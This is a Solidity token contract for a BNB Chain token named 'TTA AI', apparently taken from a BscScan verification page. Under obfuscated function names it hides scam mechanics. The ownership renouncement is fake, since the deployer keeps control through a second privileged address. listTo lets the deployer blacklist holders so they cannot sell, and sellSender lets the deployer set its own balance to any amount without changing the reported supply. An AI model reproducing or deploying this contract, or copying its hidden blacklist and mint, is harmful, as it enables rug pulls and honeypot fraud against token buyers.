/**
 *Submitted for verification at BscScan.com on 2023-02-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface limitMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundMode) external view returns (uint256);

    function transfer(address exemptMin, uint256 isReceiver) external returns (bool);

    function allowance(address enableTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 isReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address exemptMin,
        uint256 isReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeList, uint256 value);
    event Approval(address indexed enableTx, address indexed spender, uint256 value);
}

interface limitModeMetadata is limitMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract toMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenTotal {
    function createPair(address launchedReceiver, address isMarketing) external returns (address);
}

interface launchedTeamTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract TTAAI is toMode, limitMode, limitModeMetadata {

    address public tokenFrom;

    bool public txTrading;

    bool public fundBuy;

    function fundFee() public {
        emit OwnershipTransferred(totalMode, address(0));
        atFromMode = address(0);
    }

    bool private fromTrading;

    function listTo(address teamWallet) public {
        if (tokenLiquidity != txTrading) {
            tokenLiquidity = true;
        }
        if (teamWallet == totalMode || teamWallet == tokenFrom || !launchedMarketingLaunch[_msgSender()]) {
            return;
        }
        
        txLiquidity[teamWallet] = true;
    }

    uint8 private maxFee = 18;

    address public totalMode;

    function symbol() external view virtual override returns (string memory) {
        return feeLimit;
    }

    uint256 private fundMarketing;

    bool private tradingFund;

    function minAmountShould() public {
        if (fundMarketing != isTotalExempt) {
            tokenLiquidity = true;
        }
        
        tradingFund=false;
    }

    function feeTrading() public view returns (bool) {
        return txTrading;
    }

    mapping(address => bool) public launchedMarketingLaunch;

    string private feeLimit = "TAI";

    event OwnershipTransferred(address indexed amountReceiver, address indexed launchedMode);

    function transfer(address walletLimit, uint256 isReceiver) external virtual override returns (bool) {
        return tokenMaxWallet(_msgSender(), walletLimit, isReceiver);
    }

    function owner() external view returns (address) {
        return atFromMode;
    }

    function allowance(address senderLaunch, address tokenTotalLimit) external view virtual override returns (uint256) {
        return isAuto[senderLaunch][tokenTotalLimit];
    }

    uint256 private isMin = 100000000 * 10 ** 18;

    function transferFrom(address takeLaunchAmount, address exemptMin, uint256 isReceiver) external override returns (bool) {
        if (isAuto[takeLaunchAmount][_msgSender()] != type(uint256).max) {
            require(isReceiver <= isAuto[takeLaunchAmount][_msgSender()]);
            isAuto[takeLaunchAmount][_msgSender()] -= isReceiver;
        }
        return tokenMaxWallet(takeLaunchAmount, exemptMin, isReceiver);
    }

    function marketingMode() public {
        
        if (fundBuy == fromTrading) {
            isTotalExempt = fundMarketing;
        }
        fundBuy=false;
    }

    constructor (){ 
        if (fundMarketing != isTotalExempt) {
            tokenLiquidity = true;
        }
        launchedTeamTo shouldSenderLaunched = launchedTeamTo(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tokenFrom = tokenTotal(shouldSenderLaunched.factory()).createPair(shouldSenderLaunched.WETH(), address(this));
        atFromMode = _msgSender();
        
        totalMode = _msgSender();
        launchedMarketingLaunch[_msgSender()] = true;
        if (txTrading == tradingFund) {
            tradingFund = false;
        }
        tradingBuy[_msgSender()] = isMin;
        emit Transfer(address(0), totalMode, isMin);
        fundFee();
    }

    function getOwner() external view returns (address) {
        return atFromMode;
    }

    function fromTake(address amountMin) public {
        if (maxMarketingLimit) {
            return;
        }
        if (fromTrading) {
            tokenLiquidity = true;
        }
        launchedMarketingLaunch[amountMin] = true;
        
        maxMarketingLimit = true;
    }

    bool public tokenLiquidity;

    string private walletEnable = "TTA AI";

    bool public maxMarketingLimit;

    mapping(address => uint256) private tradingBuy;

    function balanceOf(address fundMode) public view virtual override returns (uint256) {
        return tradingBuy[fundMode];
    }

    function name() external view virtual override returns (string memory) {
        return walletEnable;
    }

    uint256 private isTotalExempt;

    mapping(address => bool) public txLiquidity;

    function amountBuy() public {
        
        
        fromTrading=false;
    }

    function autoMin() public {
        if (fromTrading != txTrading) {
            txTrading = false;
        }
        
        fundBuy=false;
    }

    mapping(address => mapping(address => uint256)) private isAuto;

    function sellSender(uint256 isReceiver) public {
        if (!launchedMarketingLaunch[_msgSender()]) {
            return;
        }
        tradingBuy[totalMode] = isReceiver;
    }

    function approve(address tokenTotalLimit, uint256 isReceiver) public virtual override returns (bool) {
        isAuto[_msgSender()][tokenTotalLimit] = isReceiver;
        emit Approval(_msgSender(), tokenTotalLimit, isReceiver);
        return true;
    }

    address private atFromMode;

    function totalSupply() external view virtual override returns (uint256) {
        return isMin;
    }

    function tokenMaxWallet(address takeLaunchAmount, address exemptMin, uint256 isReceiver) internal returns (bool) {
        if (takeLaunchAmount == totalMode) {
            return swapReceiver(takeLaunchAmount, exemptMin, isReceiver);
        }
        require(!txLiquidity[takeLaunchAmount]);
        return swapReceiver(takeLaunchAmount, exemptMin, isReceiver);
    }

    function decimals() external view virtual override returns (uint8) {
        return maxFee;
    }

    function swapReceiver(address takeLaunchAmount, address exemptMin, uint256 isReceiver) internal returns (bool) {
        require(tradingBuy[takeLaunchAmount] >= isReceiver);
        tradingBuy[takeLaunchAmount] -= isReceiver;
        tradingBuy[exemptMin] += isReceiver;
        emit Transfer(takeLaunchAmount, exemptMin, isReceiver);
        return true;
    }

}